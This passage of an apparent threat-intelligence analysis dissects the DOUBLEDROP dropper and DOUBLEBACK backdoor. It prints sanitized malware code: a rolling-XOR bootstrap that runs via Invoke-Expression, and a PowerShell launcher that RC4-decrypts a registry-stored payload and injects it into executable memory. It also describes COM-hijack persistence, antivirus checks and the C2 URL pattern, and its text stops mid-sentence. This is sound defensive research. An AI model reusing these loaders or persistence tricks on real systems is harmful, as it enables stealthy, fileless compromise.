launcher are described in more details in the following sections.\u003C\/p\u003E\n\u003Ch5\u003EPersistence Mechanism\u003C\/h5\u003E\n\u003Cp\u003EThe persistence mechanism implemented by the DOUBLEDROP sample is slightly different depending on whether the dropper has been started within an elevated PowerShell process or not.\u003C\/p\u003E\n\u003Cp\u003EIf the dropper was executed within an elevated PowerShell process, it creates a scheduled task with an action specified as TASK_ACTION_COM_HANDLER and the class ID - the \u003Cspan class=\u0022code\u0022\u003E{\u0026lt;rnd_guid_2\u0026gt;}\u003C\/span\u003E GUID (See Figure 5). Once executed by the system, the task finds the \u003Cspan class=\u0022code\u0022\u003E{\u0026lt;rnd_guid_2\u0026gt;}\u003C\/span\u003E class under the HKLM\\Software\\Classes\\CLSID registry path, which in this case points to an emulator class via the TreatAs registry key. The \u003Cspan class=\u0022code\u0022\u003E{\u0026lt;rnd_guid_0\u0026gt;}\u003C\/span\u003E emulator class ID defines a registry key LocalServer and its default value will be executed by the task.\u003C\/p\u003E\n\u003Cp\u003EIf the dropper is started within a non-elevated PowerShell process, the sequence is generally the same but instead of a task, the malware hijacks one of the well-known classes, Microsoft PlaySoundService ({2DEA658F-54C1- 4227-AF9B-260AB5FC3543}) or MsCtfMonitor ({01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}), by creating an associated TreatAs registry key under their definition in the registry database. The TreatAs key\u0027s default registry value points to the \u003Cspan class=\u0022code\u0022\u003E{\u0026lt;rnd_guid_0\u0026gt;}\u003C\/span\u003E emulator class essentially achieving the same execution sequence as in the elevated privilege case.\u003C\/p\u003E\n\u003Ch5\u003EBootstrap\u003C\/h5\u003E\n\u003Cp\u003EThe bootstrap is implemented as an obfuscated PowerShell script, generated dynamically by the dropper. The content of the code is saved under the emulator\u0027s class LocalServer registry key and it is either executed by a dedicated task in case of a privileged PowerShell process or by the operating system that attempts to load the emulator for the PlaySoundService or MsCtfMonitor classes.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EThe bootstrap code finds the location of the launcher script, decodes it and then executes it within the same PowerShell process. A decoded and sanitized version of the script is shown in Figure 7.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E$enc = [System.Text.Encoding]::UTF8;\u003Cbr\u003E\n $loader = Get-ItemProperty\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; -Path($enc.GetString([Convert]::FromBase64String(\u0027\u0026lt;base64_encoded_path_to_launcher\u0026gt;\u0027)))\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; -n \u0027\u0026lt;launcher_reg_val\u0026gt;\u0027 | Select-Object -ExpandProperty \u0027\u0026lt;launcher_reg_val\u0026gt;\u0027;\u003Cbr\u003E\n $xor_val = \u0026lt;xor_val\u0026gt;;\u003Cbr\u003E\n iex(\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $enc.GetString($(\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; for ($i = 0; $i -lt $loader.Length; $i++) {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; if ($xor_val -ge 250) {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $xor_val = 0\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; }\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $loader[$i] -bxor $xor_val;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $xor_val += 4\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; }\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; ))\u003Cbr\u003E\n )\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 7: De-obfuscated and sanitized bootstrap code\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ENote that the actual values for \u003Cspan class=\u0022code\u0022\u003E\u0026lt;base64_encoded_path_to_launcher\u0026gt;\u003C\/span\u003E, \u003Cspan class=\u0022code\u0022\u003E\u0026lt;launcher_reg_val\u0026gt;\u003C\/span\u003E, and \u003Cspan class=\u0022code\u0022\u003E\u0026lt;xor_val\u0026gt;\u003C\/span\u003E are generated on the fly by the dropper and will be different across the compromised systems.\u003C\/p\u003E\n\u003Cp\u003EThe encoding of the launcher is implemented as a simple rolling XOR that is incremented after each iteration. The following code snippet (Figure 8) could be used to either encode or decode the launcher, given the initial key.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003Edef encdec(src, key):\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; out = bytearray()\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; for b in src:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; if key \u0026gt;= 250:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; key = 0\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; out.append(b ^ key)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; key += 4\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; return out\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 8: Algorithm to Decode the Launcher\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EOnce the launcher is decoded it is executed within the same PowerShell process as the bootstrap by calling the iex (Invoke-Expression) command.\u003C\/p\u003E\n\u003Ch5\u003ELauncher\u003C\/h5\u003E\n\u003Cp\u003EThe launcher responsibility, after being executed by the bootstrap code, is to decrypt and execute the payload saved under the VersionIndependentProgID registry key. To do so, the launcher first decodes the RC4 key provided in the \u003Cspan class=\u0022code\u0022\u003E\u0026lt;first_4_chars_of_rnd_guid_0\u0026gt;\u003C\/span\u003E value (see Figure 5) and then uses it to decrypt the payload. Once the payload is decrypted, the launcher allocates virtual memory enough to house the image in memory, copies it there, and finally creates a thread around the entry point specified in the dropper. The function at that entry point is expected to lay the image in memory, to relocate the image, if necessary, to resolve the imports and finally\u2014to execute the payload\u0027s entry point.\u003C\/p\u003E\n\u003Cp\u003EA sanitized and somewhat de-obfuscated version of the launcher is shown in Figure 9.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Efunction DecryptPayload {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; param($fn7, $xf7, $mb5)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $fn1 = Get-ItemProperty -Path $fn7 -n $mb5 | Select-Object -ExpandProperty $mb5;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $en8 = ($fn1[32] + (19 + (((5 - 2) + 0) + 11)));\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $ow7 = $fn1[$en8..($en8 + 31)];\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; [array]::Reverse($ow7);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $fn1 = Get-ItemProperty -Path $fn7 -n $xf7 | Select-Object -ExpandProperty $xf7;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $en8 = {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $xk2 = 0..255;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; 0..255 | % {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $wn4 = ($wn4 + $xk2[$_] + $ow7[$_ % $ow7.Length]) % (275 - (3 + (11 + 5)));\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $xk2[$_], $xk2[$wn4] = $xk2[$wn4], $xk2[$_]\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; };\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $fn1 | % {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $sp3 = ($sp3 + 1) % (275 - 19);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $si9 = ($si9 + $xk2[$sp3]) % ((600 - 280) - 64);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $xk2[$sp3], $xk2[$si9] = $xk2[$si9], $xk2[$sp3];\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $_-bxor$xk2[($xk2[$sp3] + $xk2[$si9]) % (343 - ((1 + 0) + 86))]\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; }\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; };\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $ry6 = (\u0026amp; $en8 | foreach-object { \u0027{0:X2}\u0027 -f $_ }) -join \u0027\u0027;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; ($(for ($sp3 = 0; $sp3 -lt $ry6.Length; $sp3 += 2) {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; [convert]::ToByte($ry6.Substring($sp3, 2), (17 - ((1 + 0))))\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; }\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; )\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Efunction ExecuteApi {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; param($fn7, $xf7)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $vy9 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(\u0027?RND?\u0027)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(\u0027?RND?\u0027, $false).DefineType(\u0027?RND?\u0027, \u0027Class,Public,Sealed,AnsiClass,AutoClass\u0027, [System.MulticastDelegate]);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $vy9.DefineConstructor(\u0027RTSpecialName,HideBySig,Public\u0027, [System.Reflection.CallingConventions]::Standard, $fn7).SetImplementationFlags(\u0027Runtime,Managed\u0027);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $vy9.DefineMethod(\u0027Invoke\u0027, \u0027Public,HideBySig,NewSlot,Virtual\u0027, $xf7, $fn7).SetImplementationFlags(\u0027Runtime,Managed\u0027);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $vy9.CreateType()\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Efunction GetProcAddress {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; param($fn7)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $fq3 = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; $_.GlobalAssemblyCache -and $_.Location.Split(\u0027\\\\\u0027)[-1].Equals(\u0027System.dll\u0027)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; }).GetType(\u0027Microsoft.Win32.UnsafeNativeMethods\u0027);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $lr3 = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($fq3.GetMethod(\u0027GetModuleHandle\u0027).Invoke(0, @(\u0027kernel32.dll\u0027))));\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $fq3.GetMethod(\u0027GetProcAddress\u0027, [reflection.bindingflags] \u0027Public,Static\u0027, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null).Invoke($null, @([System.Runtime.InteropServices.HandleRef]$lr3, $fn7))\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E$decryptedPayload = DecryptPayload \u0027hklm:\\software\\classes\\CLSID\\\u0026lt;rnd_guid_0\u0026gt;\\VersionIndependentProgID\u0027 \u0027\u0026lt;reg_val_payload\u0026gt;\u0027 \u0027\u0026lt;reg_val_rc4_key\u0026gt;\u0027;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Efunction InjectPayload {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; param($payload, $payloadLen, $entryPoint, $access)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $mem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress \u0027VirtualAllocEx\u0027), (ExecuteApi @([IntPtr], [IntPtr], [IntPtr], [int], [int])([Intptr]))).invoke(-1, 0, $payloadLen, 0x3000, $access);\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress \u0027RtlMoveMemory\u0027), (ExecuteApi @([IntPtr], [byte[]], [UInt32])([Intptr]))).invoke($mem, $payload, $payloadLen);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; $mem = New-Object System.Intptr -ArgumentList $($mem.ToInt64() + $entryPoint);\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E\u0026nbsp;\u0026nbsp;\u0026nbsp; [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((GetProcAddress \u0027CreateThread\u0027), (ExecuteApi @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([Intptr]))).invoke(0, 0, $mem, 0, 0, 0);\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; Start-Sleep -s (((2673 - 942) + 1271))\u003Cbr\u003E\n }\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003E# 0x36dc = Loader Entry Point, rva\u003Cbr\u003E\n # 0x40 = PAGE_EXECUTE_READWRITE\u003Cbr\u003E\n InjectPayload $decryptedPayload $decryptedPayload.length 0x36dc 0x40\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 9: De-obfuscated and sanitized launcher script\u003C\/span\u003E\u003C\/p\u003E\n\u003Ch4\u003EDOUBLEBACK Backdoor component\u003C\/h4\u003E\n\u003Ch5\u003EOverview\u003C\/h5\u003E\n\u003Cp\u003EThe observed DOUBLEDROP instances contain a well-designed backdoor implemented as a 32 or 64-bit PE dynamic library which we track as DOUBLEBACK. The backdoor is initially mapped into the same PowerShell process started by the bootstrap script, but it will then inject itself into a msiexec.exe process if certain conditions are met. By design, the core of the backdoor functionality is intended to be executed after injected into a newly spawned msiexec.exe process.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003EIn contrast with other backdoors DOUBLEBACK does not have its services hardcoded and the functionality is expected to be implemented as plugins that are expected to be serialized in the registry database under a host-specific registry path. That way, the backdoor can be configured to implement a flexible set of services depending on the target. With all the common functionality implemented as plugins, the backdoor\u2019s main goal is to establish a communication framework ensuring data integrity between the C2 server and the appropriate plugins.\u003C\/p\u003E\n\u003Ch5\u003EDetails\u003C\/h5\u003E\n\u003Cp\u003EThe backdoor starts by retrieving its process name and ensures that it is either powershell.exe or msiexec.exe. In all other cases, the malware will immediately terminate itself. Normally, when first started on the system, the backdoor will be injected into the same PowerShell process that executes both the bootstrap code and the launcher. In that mode the malware may spawn (depending on certain conditions) a msiexec process and injects itself into it. More details about the logic implemented in the PowerShell and the msiexec branches are provided in the following sections.\u0026nbsp;\u003C\/p\u003E\n\u003Cp\u003ENext, the backdoor ensures that it is the only DOUBLEBACK instance currently executing on the compromised system. To do that, the malware generates a host-based pseudo-unique GUID and uses it as a mutex name. The algorithm first generates a pseudo-unique host identifier that is based on the system volume\u0027s serial number and a hardcoded salt value, as shown in Figure 10.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E# oberserved salt = 0x436ea76d\u003Cbr\u003E\n def gen_host_id(vol_ser_num, salt):\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; salted_val = (vol_ser_num + salt) \u0026amp; 0xffffffff\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; md5 = hashlib.md5(bytes(salted_val.to_bytes(4, \u0027little\u0027)))\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; second_dword = struct.unpack(\u0027\u0026lt;i\u0027, md5.digest()[4:8])[0]\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; return (salted_val + second_dword) \u0026amp; 0xffffffff\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 10: Host ID generation algorithm\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003ENext, the malware passes the generated host ID to another algorithm that generates a pseudo-unique GUID based on the input, as shown in Figure 11.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003E# src is the host ID\u003Cbr\u003E\n def gen_guid(src):\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; b = bytearray()\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; xor = 0xaabbccdd\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; for _ in range(4):\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; b += src.to_bytes(4, byteorder=\u0027little\u0027)\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; src ^= xor\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; xor = (xor + xor) \u0026amp; 0xffffffff\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; return uuid.UUID(bytes_le=bytes(b))\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 11: GUID generation algorithm\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EOnce the GUID is generated the malware formats it as Global\\{\u003Cspan class=\u0022code\u0022\u003E\u0026lt;guid\u0026gt;\u003C\/span\u003E} and attempts to open a mutex with that name. In case the mutex is already created the backdoor assumes that another instance of itself is already running and terminates itself. Otherwise, the backdoor creates the mutex and branches out depending on the detected process it currently mapped into.\u003C\/p\u003E\n\u003Ch4\u003EExecuting Within the PowerShell Process\u003C\/h4\u003E\n\u003Cp\u003EThe initial state of the backdoor execution is when it is mapped into a PowerShell process created by the bootstrap code. In this mode, the backdoor attempts to relocate itself into a new instance of msiexec.exe. Before the injection is attempted, the backdoor enumerates the running processes looking for Kaspersky Antivirus (avp.exe, avpui.exe) or BitDefender (bdagent.exe, bdservbdagent.exe, bdservicehost.exe) engines. This part of the functionality seems to be a work in progress because the malware ignores the fact if the Kaspersky software is detected but it will not attempt injecting into the msiexec.exe process in case BitDefender is found running on the compromised system. In the latter case, the backdoor\u0027s main functionality will be executed inside the same PowerShell process and no new instance of msiexec.exe will be created.\u003C\/p\u003E\n\u003Cp\u003EThe injection process involves finding the backdoor\u0027s image under the appropriate registry key. Note, that the backdoor instance we have observed in the first wave does not handle situations when the malware ecosystem is installed as an administrator\u2014such cases would end up with the backdoor not able to locate its image for injecting. In all other cases, the malware starts with the well-known class GUIDs of the PlaySoundService and MsCtfMonitor classes and attempts to find which of them has the TreatAs registry key under their definition. Once the TreatAs key is found, its default registry value points to the registry key that has the RC4-encrypted backdoor image and the encoded RC4 key both described in the previous section of the post.\u003C\/p\u003E\n\u003Cp\u003EWith the backdoor image loaded in memory and decrypted, the malware spawns a suspended process around msiexec.exe and inject its image into it. The backdoor PE file exports a single function that is used to lay down its own image in memory and execute its DllMain entry point. The export function allocates the needed memory, relocates the image, if needed, resolves the imports and finally executes the backdoor\u2019s DllMain function.\u003C\/p\u003E\n\u003Cp\u003EAt this point the backdoor is running inside the hijacked msiexec.exe and the instance inside the PowerShell process terminates itself.\u003C\/p\u003E\n\u003Ch4\u003EExecuting as Injected in the msiexec.exe Process\u003C\/h4\u003E\n\u003Ch5\u003EOverview\u003C\/h5\u003E\n\u003Cp\u003EThe DOUBLEBACK backdoor executes its main functionality while injected in a dedicated msiexec.exe process (provided BitDefender AV is not found running on the system). The main logical modules of the backdoor are its configuration, plugin management, and communications. In the following sections we will describe the first two, while a future blog post will focus on the communications and the evolution of the backdoor.\u003C\/p\u003E\n\u003Ch5\u003EConfiguration\u003C\/h5\u003E\n\u003Cp\u003EThe backdoor uses an embedded configuration that contains the C2 URLs and a key (more about the key in the second part of the post). The configuration data is formatted as shown in Figure 12.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Estruct tag_config_header_t {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t xor_val_1;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t xor_val_2;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t xor_val_3;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t xor_val_4;\u003Cbr\u003E\n } config_header_t;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Estruct tag_config_t {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; config_header_t header;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint8_t encoded_config[];\u003Cbr\u003E\n } config_t;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 12: Encoded configuration format\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe length of the encoded_config data is provided by the XOR-ing of the xor_val_1 and xor_val_2 fields of the config_header_t structure. The config_t.encoded_config blob can be decoded by XOR-ing the data with the config_header_t.xor_val_1.\u003C\/p\u003E\n\u003Cp\u003EThe decoded configuration data consists of a comma-separated list of URLs followed by a key that is used in the communication module. The first two bytes specify the lengths of the comma-separated URL list and the key, respectively. The URLs in the observed samples follow the pattern shown in Figure 13.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003Ehttps:\/\/\u0026lt;server\u0026gt;\/admin\u0026lt;n\u0026gt;\/client.php\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EFigure 13: Observed C2 URL pattern\u003C\/p\u003E\n\u003Cp\u003EThe initial sample did not have any value for \u003Cspan class=\u0022code\u0022\u003E\u0026lt;n\u0026gt;\u003C\/span\u003E but the samples after that were observed to use \u003Cspan class=\u0022code\u0022\u003E\u0026lt;n\u0026gt;\u003C\/span\u003E equal to 4 or 5.\u003C\/p\u003E\n\u003Ch5\u003EPlugin Management\u003C\/h5\u003E\n\u003Cp\u003EThe backdoor\u0027s core functionality is implemented via plugins designed as PE Windows dynamic libraries. The plugins, as with the other backdoor components, are also saved in the registry database under a host-specific registry key. The full path to the plugins location is formatted as HK[LM|CU]:\\Software\\Classes\\CLSID\\{\u003Cspan class=\u0022code\u0022\u003E\u0026lt;plugins_home_guid\u0026gt;\u003C\/span\u003E}, where \u003Cspan class=\u0022code\u0022\u003E\u0026lt;plugins_home_guid\u0026gt;\u003C\/span\u003E is generated by the GUID algorithm shown in Figure 11 with a host-specific value we call implant ID which is used not only to generate the path to the plugins but with the backdoor\u2019s C2 communications and it is also passed as a parameter to each of the plugins during their initialization. The implant ID is generated by seeding the Linear Congruential Generator (LCG) algorithm, shown in Figure 14, with the host ID and the \u003Cspan class=\u0022code\u0022\u003E\u0026lt;max_range\u0026gt;\u003C\/span\u003E value is set to 0x54c5638. The value generated by the LCG is then added to 0x989680 and the result serves as the implant ID.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003Edef lcg(max_range):\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; global seed\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; if seed == 0:\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; seed = get_RDTSC()\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; n = (0x7fffffed * seed + 0x7fffffc3) \u0026amp; 0xffffffff\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; val = n % max_range\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; seed = n\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; return val\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 14: Linear Congruential Generator used by the backdoor\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EThe backdoor enumerates all the registry values under the plugins home location (the registry value names are insignificant) and expects each of the plugins to be formatted, as shown in Figure 15.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Estruct tag_plugin_header_t {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t xor_val;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t param_2; the second parameter of the pfn_init\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t len_1;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t len_2;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t pfn_init;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t pfn_cleanup;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t param_3; the third parameter of the pfn_init\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; uint32_t unused;\u003Cbr\u003E\n } plugin_header_t;\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003E\u003Cspan class=\u0022code\u0022\u003Estruct tag_plugin_t {\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;plugin_header_t header;\u003Cbr\u003E\n \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;uint8_t encoded_plugin[];\u003Cbr\u003E\n } plugin_t;\u003C\/span\u003E\u003C\/p\u003E\n\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003E\u003Cspan class=\u0022type-XS\u0022\u003EFigure 15: Encoded plugins format\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAs shown in Figure 15, the plugin data starts with a 32-byte long header followed by the encoded plugin DLL. The plugin encoding is 